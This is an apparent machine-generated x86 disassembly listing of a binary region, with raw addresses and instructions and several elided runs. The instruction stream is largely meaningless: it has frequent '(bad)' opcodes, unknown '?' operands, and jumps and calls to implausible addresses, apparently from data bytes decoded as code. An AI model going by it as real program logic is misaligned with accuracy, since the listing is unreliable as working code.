  427b1a:	push   ebx
  427b1b:	sti    
  427b1c:	jmp    0x427ad9
  427b1e:	pop    edx
  427b1f:	dec    eax
  427b20:	pop    edx
  427b21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427b22:	jnp    0x427ad7
  427b24:	add    al,BYTE PTR [edi]
  427b26:	mov    dl,0xa7
  427b28:	add    DWORD PTR [eax],eax
  427b2a:	pop    es
  427b2b:	add    DWORD PTR [eax],eax
  427b2d:	add    BYTE PTR [edi+0x9],bh
  427b30:	popf   
  427b31:	cld    
  427b32:	pop    ebx
  427b33:	mov    WORD PTR [eax-0x12],gs
  427b36:	mov    al,0x54
  427b38:	adc    BYTE PTR [edx],0xe5
  427b3b:	fcmovnu st,st(4)
  427b3d:	xchg   ecx,ecx
  427b3f:	arpl   WORD PTR [esi-0x51],si
  427b42:	fs es mov dl,0x3e
  427b46:	outs   dx,DWORD PTR ds:[esi]
  427b47:	or     edi,DWORD PTR [eax]
  427b49:	ficomp WORD PTR [ebx+0x19cea494]
  427b4f:	pop    ds
  427b50:	out    0x83,eax
  427b52:	cmp    BYTE PTR ds:0xe29b06fd,ah
  427b58:	xor    DWORD PTR ds:0x186566c1,ecx
  427b5e:	and    eax,0xb9b7f34e
  427b63:	cdq    
  427b64:	cs (bad) 
  427b67:	in     al,0xd5
  427b69:	sub    DWORD PTR ds:0x64e0c630,edi
  427b6f:	jp     0x427b74
  427b71:	and    ah,bh
  427b73:	xor    al,0x76
  427b75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427b76:	call   0xf0a229e5
  427b7b:	cdq    
  427b7c:	xchg   ebp,eax
  427b7d:	sub    al,0x5e
  427b7f:	jmp    0x427c00
  427b81:	repz cmp eax,0x31ed8468
  427b87:	pop    ds
  427b88:	(bad)  
  427b89:	xchg   edi,eax
  427b8a:	jg     0x427b9a
  427b8c:	retf   0x1612
  427b8f:	jne    0x427b78
  427b91:	add    ecx,DWORD PTR [edi]
  427b93:	jge    0x427b63
  427b95:	or     esi,DWORD PTR [ebx]
  427b97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427b98:	loopne 0x427bd1
  427b9a:	mov    ebx,ds
  427b9c:	in     eax,0x9f
  427b9e:	test   al,0x1d
  427ba0:	xchg   ebp,eax
  427ba1:	xor    eax,0xa2ef3def
  427ba6:	or     al,0xc1
  427ba8:	pop    ds
  427ba9:	(bad)
  427bac:	outs   dx,BYTE PTR ds:[esi]
  427bad:	cmp    DWORD PTR [eax+esi*8],edi
  427bb0:	out    0xa6,al
  427bb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427bb3:	xchg   DWORD PTR [ebp+0x6c],edx
  427bb6:	xchg   edx,eax
  427bb7:	mov    esi,0x5e8de0e2
  427bbc:	mov    esp,esi
  427bbe:	stos   BYTE PTR es:[edi],al
  427bbf:	xor    eax,0xa9634f88
  427bc4:	call   0xb6c9d460
  427bc9:	imul   edx
  427bcb:	ds ds cdq 
  427bce:	push   ebp
  427bcf:	fwait
  427bd0:	cs aaa 
  427bd2:	push   esp
  427bd3:	jnp    0x427c52
  427bd5:	mov    dh,0x75
  427bd7:	pop    ds
  427bd8:	xchg   BYTE PTR [edx+eiz*4-0x4b590922],dh
  427bdf:	ret    0xdbcc
  427be2:	popa   
  427be3:	xlat   BYTE PTR ds:[ebx]
  427be4:	cli    
  427be5:	push   ss
  427be6:	cmp    al,0x20
  427be8:	mov    ds:0x5818e3db,al
  427bed:	lds    esp,FWORD PTR [ecx-0x4ffb0d7]
  427bf3:	pop    edx
  427bf4:	imul   ebp,DWORD PTR [eax],0x74d5c672
  427bfa:	(bad)  
  427bfb:	call   0x18ca1c58
  427c00:	mov    esi,0x260b457
  427c05:	fidiv  WORD PTR [eax]
  427c07:	les    edx,FWORD PTR [eax+0x598c17d0]
  427c0d:	mov    dh,0xbf
  427c0f:	cld    
  427c10:	push   ebx
  427c11:	lahf   
  427c12:	dec    edi
  427c13:	dec    edx
  427c14:	int3   
  427c15:	mov    ch,0x9f
  427c17:	xchg   ecx,eax
  427c18:	iret   
  427c19:	sbb    DWORD PTR [ecx+0x749f4f92],0xffffff82
  427c20:	jne    0x427c29
  427c22:	ins    BYTE PTR es:[edi],dx
  427c23:	(bad)  
  427c24:	pop    ebx
  427c25:	xor    ch,BYTE PTR [ebx]
  427c27:	(bad)  
  427c28:	dec    edi
  427c29:	add    ebx,DWORD PTR [edx+0x6ce38ccd]
  427c2f:	push   eax
  427c30:	push   edx
  427c31:	in     eax,0xb8
  427c33:	push   0x17
	...
  427c94:	add    BYTE PTR [eax],al
  427c96:	mov    ds:0xf343b050,eax
  427c9b:	jecxz  0x427c90
  427c9d:	lock xchg edi,eax
  427c9f:	fmul   DWORD PTR ds:0x6456785
  427ca5:	ja     0x427c60
  427ca7:	test   al,0x1
  427ca9:	add    BYTE PTR [edi],al
  427cab:	add    DWORD PTR [eax],eax
  427cad:	add    BYTE PTR [eax-0x6876c463],bh
  427cb3:	enter  0x9882,0xf0
  427cb7:	jbe    0x427ce7
  427cb9:	in     al,0x7f
  427cbb:	pop    edi
  427cbc:	inc    esp
  427cbd:	or     bl,BYTE PTR [esi+ebp*2]
  427cc0:	xchg   esp,eax
  427cc1:	push   edi
  427cc2:	call   0x5ec2eacb
  427cc7:	xor    BYTE PTR [ecx-0x77],bl
  427cca:	push   ds
  427ccb:	jmp    0x427c55
  427ccd:	test   al,bh
  427ccf:	jp     0x427d0e
  427cd1:	aaa    
  427cd2:	out    dx,al
  427cd3:	jle    0x427ca4
  427cd5:	mov    bh,0x41
  427cd7:	push   ds
  427cd8:	xchg   BYTE PTR [eax+edi*4],bl
  427cdb:	adc    eax,ebx
  427cdd:	sar    DWORD PTR [edx],0x14
  427ce0:	std    
  427ce1:	inc    ebp
  427ce2:	push   ds
  427ce3:	pop    eax
  427ce4:	outs   dx,DWORD PTR ds:[esi]
  427ce5:	sub    DWORD PTR [edx-0x74],ebp
  427ce8:	push   ebp
  427ce9:	imul   esp,ecx,0xffffff9f
  427cec:	cdq    
  427ced:	xchg   esp,eax
  427cee:	push   ecx
  427cef:	sub    eax,0x5dd5d1c7
  427cf4:	call   0x989bca6b
  427cf9:	loopne 0x427cc5
  427cfb:	cmp    al,0x5d
  427cfd:	sub    DWORD PTR [ecx+0x69c95e0],0xed1a3139
  427d07:	int3   
  427d08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427d09:	popa   
  427d0a:	dec    esi
  427d0b:	and    DWORD PTR [eax+0x185bf308],ecx
  427d11:	pushf  
  427d12:	fucomp st(7)
  427d14:	and    esi,DWORD PTR [ecx+ebx*8-0x79]
  427d18:	jmp    0x1658:0xcbf50de1
  427d1f:	xchg   ebx,eax
  427d20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427d21:	in     eax,dx
  427d22:	pop    ebx
  427d23:	dec    esi
  427d24:	shr    BYTE PTR [ecx+0x75b41744],0xdc
  427d2b:	jb     0x427cb6
  427d2d:	arpl   WORD PTR ds:0xc22030f1,dx
  427d33:	lock les esp,FWORD PTR [edi-0x1e]
  427d37:	sub    eax,0x45f1ca40
  427d3c:	repnz lock push esp
  427d3f:	repz sub DWORD PTR cs:[ecx+0xf],0x23054f63
  427d48:	leave  
  427d49:	inc    eax
  427d4a:	subps  xmm3,XMMWORD PTR ds:[esi]
  427d4e:	mov    ds:0x4e647167,eax
  427d53:	jp     0x427d14
  427d55:	cmc    
  427d56:	sbb    BYTE PTR [edx],dl
  427d58:	sti    
  427d59:	popa   
  427d5a:	pop    ds
  427d5b:	cmp    BYTE PTR ss:[esi-0x7baf36be],al
  427d62:	mov    esp,0x104d682f
  427d67:	fstp   DWORD PTR [esi-0x48]
  427d6a:	mov    eax,ds:0xc4eb60d4
  427d6f:	popa   
  427d70:	pop    edx
  427d71:	push   ebp
  427d72:	arpl   WORD PTR [eax],dx
  427d74:	sbb    eax,0x92613c9f
  427d79:	out    dx,eax
  427d7a:	mov    ebp,0x71fb0b83
  427d7f:	sbb    BYTE PTR [eax-0x5b],bl
  427d82:	push   ss
  427d83:	jo     0x427ddc
  427d85:	mov    ah,0xf5
  427d87:	and    BYTE PTR [ebp+0x4278e13f],bl
  427d8d:	outs   dx,DWORD PTR ds:[esi]
  427d8e:	(bad)  
  427d8f:	aad    0xd1
  427d91:	cli    
  427d92:	pop    esp
  427d93:	mov    ah,0x5
  427d95:	stos   BYTE PTR es:[edi],al
  427d96:	or     al,BYTE PTR gs:[esi+0x2d7e260f]
  427d9d:	mov    edi,0xfd257d3b
  427da2:	sub    esi,DWORD PTR [ebp+0xb]
  427da5:	jl     0x427df8
  427da7:	ss or  edi,0xffffffa9
  427dab:	inc    ecx
  427dac:	sub    DWORD PTR [edx-0x292a4c11],edi
  427db2:	mov    ecx,0x1921
	...
  427e13:	add    BYTE PTR [eax],al
  427e15:	add    BYTE PTR [eax+0x6d3c25f1],bh
  427e1b:	cld    
  427e1c:	mov    ecx,0xf22c23f5
  427e21:	add    BYTE PTR [eax+0x3c],dl
  427e24:	mov    eax,ds:0x1a9c0b0
  427e29:	add    BYTE PTR [edi],al
  427e2b:	add    DWORD PTR [eax],eax
  427e2d:	add    BYTE PTR [esi+0x3eb357ef],al
  427e33:	xchg   edx,eax
  427e34:	push   edi
  427e35:	inc    ebx
  427e36:	(bad)  [esi+0x7f]
  427e39:	adc    edi,ebx
  427e3b:	inc    edi
  427e3c:	pop    ds
  427e3d:	adc    eax,0x52ef4313
  427e42:	xchg   esp,eax
  427e43:	cmc    
  427e44:	daa    
  427e45:	jmp    0x7abc551b
  427e4a:	add    edx,DWORD PTR [edi-0x79]
  427e4d:	jge    0x427dec
  427e4f:	pop    ds
  427e50:	jns    0x427e06
  427e52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427e53:	xor    bl,ch
  427e55:	mov    bl,0x22
  427e57:	fild   QWORD PTR [edx]
  427e59:	daa    
  427e5a:	scas   eax,DWORD PTR es:[edi]
  427e5b:	mov    al,ds:0xa8325b09
  427e60:	and    DWORD PTR [esi+ecx*8],edx
  427e63:	push   edi
  427e64:	popa   
  427e65:	fisubr DWORD PTR [esi]
  427e67:	fs cwde 
  427e69:	stc    
  427e6a:	iret   
  427e6b:	fimul  DWORD PTR [ebp+0x43d88d3b]
  427e71:	or     esi,DWORD PTR [ecx-0x93caccc]
  427e77:	push   edi
  427e78:	call   FWORD PTR [ebp+eax*8+0x1d]
  427e7c:	js     0x427e48
  427e7e:	add    BYTE PTR [eax+0x1d],0x7f
  427e82:	in     al,dx
  427e83:	gs or  eax,0x8e06e67a
  427e89:	scas   al,BYTE PTR es:[edi]
  427e8a:	(bad)  
  427e8b:	jb     0x427efc
  427e8d:	mov    BYTE PTR [ebp+0x4e],ah
  427e90:	hlt    
  427e91:	daa    
  427e92:	push   edx
  427e93:	clc    
  427e94:	in     eax,dx
  427e95:	pop    edx
  427e96:	pop    edi
  427e97:	loop   0x427eb5
  427e99:	cli    
  427e9a:	and    eax,0x40f77973
  427e9f:	aam    0xf3
  427ea1:	test   BYTE PTR [ecx-0x2a],0x0
  427ea5:	mov    ecx,0x35fb02
  427eaa:	daa    
  427eab:	push   esp
  427eac:	jmp    0x474b:0xe3bc61d5
  427eb3:	imul   eax,DWORD PTR [ecx+ebx*2+0x5a],0x551fe4a4
  427ebb:	inc    esi
  427ebc:	test   al,0x81
  427ebe:	xchg   DWORD PTR [edi-0x26],esi
  427ec1:	push   edx
  427ec2:	xor    eax,0x485de7c1
  427ec7:	fdiv   DWORD PTR [edx-0x73bec6eb]
  427ecd:	inc    ebx
  427ece:	ret    
  427ecf:	(bad)  
  427ed0:	adc    al,0x9
  427ed2:	stos   DWORD PTR es:[edi],eax
  427ed3:	arpl   di,bp
  427ed5:	mov    ds:0xedd23649,eax
  427eda:	lea    edi,[edx-0x22fa27c3]
  427ee0:	jmp    0x427ebd
  427ee2:	in     eax,dx
  427ee3:	outs   dx,DWORD PTR ds:[esi]
  427ee4:	in     al,dx
  427ee5:	fidivr WORD PTR [esi+0xd768718]
  427eeb:	mov    eax,ds:0x656b0900
  427ef0:	leave  
  427ef1:	adc    al,0x2d
  427ef3:	push   esi
  427ef4:	sub    al,0x21
  427ef6:	xchg   ebx,eax
  427ef7:	pop    esp
  427ef8:	xchg   edi,eax
  427ef9:	add    BYTE PTR [edi+0x70b90200],al
  427eff:	fsub   DWORD PTR [ebp+0x1c]
  427f02:	mov    ch,0x6d
  427f04:	jbe    0x427ed0
  427f06:	ror    BYTE PTR [edx+0x5d],cl
  427f09:	xor    DWORD PTR [eax+0x6a95743d],edx
  427f0f:	fbld   TBYTE PTR [edx+edi*2-0x3f]
  427f13:	addr16 cmc 
  427f15:	adc    al,0xdc
  427f17:	cmp    ecx,DWORD PTR [ecx+0x7c]
  427f1a:	jo     0x427ec5
  427f1c:	test   BYTE PTR [eax-0x5a],cl
  427f1f:	adc    BYTE PTR [edi+0x63],al
  427f22:	push   0xd6838ba8
  427f27:	jge    0x427f90
  427f29:	sbb    edi,eax
  427f2b:	mov    dh,0xdd
  427f2d:	inc    esp
  427f2e:	mov    WORD PTR [eax-0x1f],?
  427f31:	loopne 0x427ef6
  427f33:	mov    ds:0xff,al
	...
  427f94:	add    BYTE PTR [eax],al
  427f96:	mov    cl,0xa7
  427f98:	dec    ebx
  427f99:	das    
  427f9a:	pop    edi
  427f9b:	out    dx,eax
  427f9c:	cmc    
  427f9d:	mov    edi,0x85e029ac
  427fa2:	push   ecx
  427fa3:	cmp    al,0x38
  427fa5:	repnz (bad) 
  427fa7:	stos   BYTE PTR es:[edi],al
  427fa8:	add    DWORD PTR [eax],eax
  427faa:	pop    es
  427fab:	add    DWORD PTR [eax],eax
  427fad:	add    ah,ah
  427faf:	outs   dx,DWORD PTR ds:[esi]
  427fb0:	inc    ebx
  427fb1:	ins    BYTE PTR es:[edi],dx
  427fb2:	cmp    BYTE PTR [ecx],ch
  427fb4:	jecxz  0x42801e
  427fb6:	sub    DWORD PTR [ebp+edx*1+0x47],esi
  427fba:	hlt    
  427fbb:	scas   eax,DWORD PTR es:[edi]
  427fbc:	mov    DWORD PTR [ebx-0x1c],eax
  427fbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427fc0:	push   esp
  427fc1:	or     ah,bh
  427fc3:	sar    cl,1
  427fc5:	mov    fs,WORD PTR [edx+0x62]
  427fc8:	mov    ?,esi
  427fca:	mov    ch,0x11
  427fcc:	pusha  
  427fcd:	shl    DWORD PTR [edi+0x5887f420],cl
  427fd3:	js     0x428005
  427fd5:	mov    ebx,0xc12e7ca0
  427fda:	es dec ebp
  427fdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427fdd:	push   ebp
  427fde:	dec    ebp
  427fdf:	add    DWORD PTR cs:[edi],ecx
  427fe2:	mov    esi,0x88821edd
  427fe7:	loop   0x428024
  427fe9:	lods   al,BYTE PTR ds:[esi]
  427fea:	sub    al,BYTE PTR [edi]
  427fec:	or     ecx,DWORD PTR [esi-0x77]
  427fef:	inc    edi
  427ff0:	or     BYTE PTR [ebx-0x6c],bh
  427ff3:	push   ebp
  427ff4:	inc    ebp
  427ff5:	jle    0x428012
  427ff7:	jg     0x428038
  427ff9:	xchg   BYTE PTR [edx+0x312043cc],ch
  427fff:	nop
  428000:	into   
  428001:	loope  0x42801b
  428003:	adc    esi,DWORD PTR [ebx]
  428005:	(bad)  
  428006:	aad    0xd7
  428008:	mov    esp,0x67675487
  42800d:	dec    ebp
  42800e:	or     BYTE PTR [esi],al
  428010:	outs   dx,BYTE PTR ds:[esi]
  428011:	test   edx,ebx
  428013:	mov    ebp,0xcd3d7dd0
  428018:	je     0x428006
  42801a:	jle    0x427fb1
  42801c:	sahf   
  42801d:	pop    ss
  42801e:	mov    ah,0xbf
  428020:	loope  0x427fb5
  428022:	test   eax,0xfdc97191
  428027:	js     0x428086
  428029:	or     dl,bl
  42802b:	mov    eax,0xc87423ec
  428030:	imul   esi,ebx,0xffffffd9
  428033:	cmp    esi,esp
  428035:	xor    al,BYTE PTR [ebp+0x47]
  428038:	cld    
  428039:	iret   
  42803a:	xlat   BYTE PTR ds:[ebx]
  42803b:	jb     0x4280bb
  42803d:	lds    esi,FWORD PTR [esi]
  42803f:	cmp    BYTE PTR [edi+0x1c],dl
  428042:	push   es
  428043:	imul   ebp,DWORD PTR [ecx],0x2a320c6e
  428049:	popf   
  42804a:	push   ss
  42804b:	out    0xa3,al
  42804d:	(bad)  
  42804e:	push   edx
  42804f:	rcl    ebx,0x9c
  428052:	arpl   WORD PTR [eax],dx
  428054:	dec    ecx
  428055:	idiv   BYTE PTR [eax+0x76]
  428058:	xchg   edx,eax
  428059:	iret   
  42805a:	popf   
  42805b:	xor    ebx,DWORD PTR [esi]
  42805d:	mov    ecx,0x5024be23
  428062:	dec    esi
  428063:	pop    esp
  428064:	sbb    ecx,esi
  428066:	ret    
  428067:	cmp    dh,0xe9
  42806a:	mov    BYTE PTR [eax],dh
  42806c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42806d:	nop
  42806e:	dec    edx
  42806f:	xor    eax,0xbb802dfd
  428074:	mov    al,0xd0
  428076:	frstor [ebx+0x34]
  428079:	in     eax,0x32
  42807b:	(bad)  
  42807d:	add    BYTE PTR [ecx+ebx*1],dh
  428080:	fidivr WORD PTR [esi-0x41]
  428083:	add    al,0xef
  428085:	sbb    al,0x59
  428087:	(bad)  
  428089:	jecxz  0x428097
  42808b:	and    BYTE PTR [edi-0xf0c152f],bl
  428091:	leavew 
  428093:	mov    esp,DWORD PTR [esi+ecx*1]
  428096:	and    BYTE PTR [ecx-0x24c19b5c],ah
  42809c:	repz in al,0xf6
  42809f:	bound  edi,QWORD PTR [edi+edi*8-0x1944ba00]
  4280a6:	cmp    BYTE PTR [ecx+0x7d3e2ba8],ah
  4280ac:	dec    ebx
  4280ad:	sub    ax,0xe71e
  4280b1:	mov    edx,0xc5fca0
	...
  428116:	fucomip st,st(6)
  428118:	std    
  428119:	dec    esp
  42811a:	std    
  42811b:	pop    edi
  42811c:	(bad)  
  42811d:	(bad)  
  42811e:	cmp    al,0x36
  428120:	cmp    esp,ebp
  428122:	push   edx
  428123:	mov    ch,BYTE PTR [ecx+ebp*2]
  428126:	into   
  428127:	stos   DWORD PTR es:[edi],eax
  428128:	add    DWORD PTR [eax],eax
  42812a:	pop    es
  42812b:	add    DWORD PTR [eax],eax
  42812d:	add    BYTE PTR [ecx-0xd15eda7],bh
  428133:	mov    al,0xb5
  428135:	test   BYTE PTR [esi-0x14],dh
  428138:	addr16 icebp 
  42813a:	xor    DWORD PTR [ebp+0x2f],0xffffffd5
  42813e:	shl    DWORD PTR [eax],cl
  428140:	sar    DWORD PTR [ebx+ebx*8+0x2601bcfe],0x14
  428148:	xor    eax,0xa4a3a2c
  42814d:	cdq    
  42814e:	ret    
  42814f:	nop
  428150:	lahf   
  428151:	aam    0x87
  428153:	je     0x428183
  428155:	pop    esi
  428156:	outs   dx,DWORD PTR ds:[esi]
  428157:	lods   eax,DWORD PTR ds:[esi]
  428158:	jns    0x428110
  42815a:	add    al,0x69
  42815c:	dec    ecx
  42815d:	es (bad) 
  42815f:	imul   esi,DWORD PTR [edx+0x6b],0xf74c13d7
  428166:	scas   al,BYTE PTR es:[edi]
  428167:	loope  0x4281b4
  428169:	dec    edi
  42816a:	push   eax
  42816b:	xchg   DWORD PTR [ecx-0x4a56391e],ebx
  428171:	adc    DWORD PTR [esi-0x6321d215],esp
  428177:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428178:	fstp   TBYTE PTR [ebp-0x37]
  42817b:	jmp    0x1149067b
  428180:	pop    esp
  428181:	sar    DWORD PTR [edi+0x65276320],1
  428187:	xchg   DWORD PTR [ecx-0x3ace13e8],edx
  42818d:	mov    ah,0xd9
  42818f:	(bad)  
  428190:	dec    ebp
  428191:	mov    ds:0x54252cf6,eax
  428196:	push   edi
  428197:	pop    ecx
  428198:	mov    esp,0xab4eb3a
  42819d:	out    dx,eax
  42819e:	fxch   st(1)
  4281a0:	in     al,dx
  4281a1:	and    BYTE PTR [edx],dh
  4281a3:	enter  0x4972,0xd3
  4281a7:	or     al,0xa9
  4281a9:	inc    eax
  4281aa:	xor    DWORD PTR [eax+0x70],ecx
  4281ad:	jecxz  0x428228
  4281af:	inc    edi
  4281b0:	les    ecx,FWORD PTR [ecx-0x3f7dec6a]
  4281b6:	outs   dx,DWORD PTR ds:[esi]
  4281b7:	shl    DWORD PTR [ecx],cl
  4281b9:	xchg   ebp,eax
  4281ba:	mov    ds:0x42593e64,al
  4281bf:	stos   BYTE PTR es:[edi],al
  4281c0:	pop    es
  4281c1:	sahf   
  4281c2:	or     al,0x9b
  4281c4:	and    eax,ecx
  4281c6:	mov    ebx,esi
  4281c8:	adc    BYTE PTR [edx],bl
  4281ca:	or     edx,DWORD PTR [ebx+0x6c]
  4281cd:	sar    DWORD PTR [esi],cl
  4281cf:	test   eax,0x6b477e72
  4281d4:	int3   
  4281d5:	mov    ch,0xd5
  4281d7:	add    al,0x15
  4281d9:	pushf  
  4281da:	in     al,0x4c
  4281dc:	fidivr DWORD PTR ds:0x778fcb89
  4281e2:	jmp    0xee0bb768
  4281e7:	add    cl,dl
  4281e9:	xchg   esp,eax
  4281ea:	call   0x31bb7be6
  4281ef:	inc    esi
  4281f0:	or     al,0x12
  4281f2:	jns    0x428183
  4281f4:	cmp    edx,esi
  4281f6:	frstor [eax]
  4281f8:	loopne 0x4281dd
  4281fa:	xor    DWORD PTR [esi+ebx*4+0x3b],esp
  4281fe:	cmp    DWORD PTR [edx-0x6183aac],eax
  428204:	test   al,0xe2
  428206:	iret   
  428207:	mov    ch,0x84
  428209:	pop    ebp
  42820a:	jnp    0x4281ca
  42820c:	sbb    edx,DWORD PTR [edi]
  42820e:	mov    edx,0xc3856cd3
  428213:	leave  
  428214:	test   BYTE PTR [ebx+edx*1+0x5516d67e],ah
  42821b:	xchg   ebx,eax
  42821c:	push   0xc9715c7a
  428221:	es mov esp,0x83441954
  428227:	mov    ds:0xbe91f11c,eax
  42822c:	dec    ebp
  42822d:	mov    gs,WORD PTR [esi-0x70]
  428230:	adc    DWORD PTR ds:0x23aa3,edi
	...
  428296:	(bad)  
  428297:	fidiv  WORD PTR [esi]
  428299:	loop   0x4282da
  42829b:	jmp    0x52eb:0x1ad8ffd7
  4282a2:	lods   al,BYTE PTR ds:[esi]
  4282a3:	daa    
  4282a4:	jne    0x428243
  4282a6:	aad    0xac
  4282a8:	add    DWORD PTR [eax],eax
  4282aa:	pop    es
  4282ab:	add    DWORD PTR [eax],eax
  4282ad:	add    BYTE PTR [ebx+ebp*4],ch
  4282b0:	daa    
  4282b1:	inc    esi
  4282b2:	mov    ebx,0x123738d1
  4282b7:	inc    ebx
  4282b8:	mov    dl,0x42
  4282ba:	shr    BYTE PTR [ebp+0x51ddb539],1
  4282c0:	add    ch,bl
  4282c2:	adc    BYTE PTR [ecx-0x1],cl
  4282c5:	push   ecx
  4282c6:	scas   al,BYTE PTR es:[edi]
  4282c7:	adc    bh,bl
  4282c9:	mov    al,ds:0x633a2f2f
  4282ce:	cmp    ecx,DWORD PTR [edi-0x356ea765]
  4282d4:	enter  0x4454,0xec
  4282d8:	retf   0x4651
  4282db:	iret   
  4282dc:	or     bl,bl
  4282de:	popa   
  4282df:	mov    esp,0x87b73e47
  4282e4:	inc    edx
  4282e5:	push   esp
  4282e6:	stc    
  4282e7:	test   DWORD PTR [eax],0x9e240693
  4282ed:	add    eax,0xc41cc7d9
  4282f2:	mov    dh,0x10
  4282f4:	sub    esi,DWORD PTR [ebp-0x37]
  4282f7:	ret    0xacb8
  4282fa:	shr    DWORD PTR [esi],0x57
  4282fd:	int3   
  4282fe:	fs sbb dh,0x9e
  428302:	push   0x466bde17
  428307:	cli    
  428308:	push   es
  428309:	stc    
  42830a:	(bad)  
  42830b:	pusha  
  42830c:	pop    esi
  42830d:	pop    edi
  42830e:	enter  0x5d9d,0x9
  428312:	jne    0x428342
  428314:	mov    ds:0x142b643a,al
  428319:	(bad)  
  42831a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42831b:	sbb    dl,BYTE PTR [esi+0x56]
  42831e:	push   0x8670cadc
  428323:	stos   DWORD PTR es:[edi],eax
  428324:	or     DWORD PTR [ebp-0x6],eax
  428327:	cmp    eax,0x5a89d2e7
  42832c:	jb     0x428389
  42832e:	jle    0x428310
  428330:	mov    cl,0x1f
  428332:	addr16 fwait
  428334:	and    ah,BYTE PTR [ebp+0x29]
  428337:	add    al,0xac
  428339:	in     al,dx
  42833a:	adc    BYTE PTR [eax-0x2686ea42],0x60
  428341:	sub    edx,ebp
  428343:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428344:	cmp    BYTE PTR [eax],bh
  428346:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428347:	mov    BYTE PTR [di+0x57],dl
  42834b:	mov    ecx,0x69adf22e
  428350:	pop    eax
  428351:	push   ecx
  428352:	and    DWORD PTR [eax-0x60],edi
  428355:	add    ecx,eax
  428357:	mov    BYTE PTR [esi],dl
  428359:	cmp    BYTE PTR [edx],cl
  42835b:	retf   
  42835c:	and    esp,edx
  42835e:	add    ebx,edi
  428360:	jle    0x4283af
  428362:	xor    eax,eax
  428364:	pop    ecx
  428365:	mov    ds:0xeac85b4f,eax
  42836a:	mov    ds:0x3805b373,eax
  42836f:	adc    DWORD PTR [ebp-0x4e],0x4
  428373:	daa    
  428374:	xor    eax,0x71ddbf88
  428379:	push   ebx
  42837a:	pop    ss
  42837b:	cmp    BYTE PTR ds:0x92255e6f,cl
  428381:	adc    BYTE PTR [ebp+0x72],al
  428384:	(bad)  
  428385:	mov    es,WORD PTR [esi+0x45]
  428388:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428389:	imul   DWORD PTR [ecx-0x28d92e20]
  42838f:	jne    0x42834d
  428391:	and    BYTE PTR [ebp+0xdd74391],dl
  428397:	and    esi,DWORD PTR [edx+eax*2+0x5]
  42839b:	mov    bl,0xe2
  42839d:	push   edi
  42839e:	sti    
  42839f:	mov    ch,0x19
  4283a1:	xor    BYTE PTR [ecx],0x5e
  4283a4:	fisttp QWORD PTR [ebx+0x46738d44]
  4283aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4283ab:	out    0x36,al
  4283ad:	or     eax,0x3a01b9c1
  4283b2:	ds add al,0x44
	...
  428415:	add    BYTE PTR [esi],cl
  428417:	xchg   esp,eax
  428418:	jg     0x42847d
  42841a:	(bad)  
  42841b:	jmp    0x42843b
  42841d:	std    
  42841e:	push   ebx
  42841f:	int    0x1
  428421:	dec    BYTE PTR [ebp-0x23bbc4e1]
  428427:	lods   eax,DWORD PTR ds:[esi]
  428428:	add    DWORD PTR [eax],eax
  42842a:	pop    es
  42842b:	add    DWORD PTR [eax],eax
  42842d:	add    BYTE PTR [edx-0x69],cl
  428430:	outs   dx,DWORD PTR ds:[esi]
  428431:	jo     0x4283e4
  428433:	mov    ah,0x47
  428435:	repz or ch,BYTE PTR [eax+ebp*4]
  428439:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42843a:	mov    esi,0x159c7b63
  42843f:	(bad)  
  428440:	div    eax
  428442:	mov    DWORD PTR [eax],eax
  428444:	xor    ebx,ebx
  428446:	push   ebx
  428447:	mov    cl,0x8f
  428449:	pop    ds
  42844a:	cmp    eax,ebx
  42844c:	adc    dl,BYTE PTR [esi+0xadcaba6]
  428452:	inc    edi
  428453:	sbb    edx,DWORD PTR [edx]
  428455:	fcmovne st,st(7)
  428457:	jecxz  0x42848e
  428459:	xchg   ecx,eax
  42845a:	pop    eax
  42845b:	adc    eax,0x5f68058e
  428460:	mov    edi,0xaaf8dc83
  428465:	mov    ?,ebx
  428467:	iret   
  428468:	test   al,0x31
  42846a:	inc    ebp
  42846b:	stc    
  42846c:	gs pop esi
  42846e:	add    ecx,ebx
  428470:	stos   DWORD PTR es:[edi],eax
  428471:	ja     0x42840d
  428473:	in     eax,dx
  428474:	sub    ebp,ebx
  428476:	mov    ebp,DWORD PTR [esp+esi*2-0x21]
  42847a:	inc    ebx
  42847b:	repnz mov al,0xda
  42847e:	mov    bh,0x72
  428480:	sub    ch,BYTE PTR [edx-0x349e23d8]
  428486:	(bad)  
  428487:	dec    ecx
  428488:	cmc    
  428489:	mov    edi,0x1bc7331f
  42848e:	pop    edi
  42848f:	pop    esp
  428490:	loopne 0x428447
  428492:	fisubr WORD PTR [esi]
  428494:	mov    eax,ds:0x52fb44f4
  428499:	sbb    al,0x84
  42849b:	pop    ds
  42849c:	fbstp  TBYTE PTR [esi+0x54f9db30]
  4284a2:	cmp    ebx,0xf5302600
  4284a8:	ins    BYTE PTR es:[edi],dx
  4284a9:	adc    eax,0x23bc1af6
  4284ae:	and    al,0x39
  4284b0:	es xchg ebx,eax
  4284b2:	gs loopne 0x42847c
  4284b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4284b6:	icebp  
  4284b7:	dec    esi
  4284b8:	fnstsw WORD PTR [eax+0x5e6e5002]
  4284be:	push   edi
  4284bf:	xor    ecx,DWORD PTR [ebp-0x35e841e5]
  4284c5:	sbb    cl,dl
  4284c7:	adc    esi,DWORD PTR es:[ecx]
  4284ca:	out    dx,eax
  4284cb:	jl     0x4284c9
  4284cd:	or     al,0xe7
  4284cf:	sar    DWORD PTR [ebp+0x59],0x2f
  4284d3:	fcom   st(1)
  4284d5:	nop
  4284d6:	cdq    
  4284d7:	xor    al,0x20
  4284d9:	inc    ebp
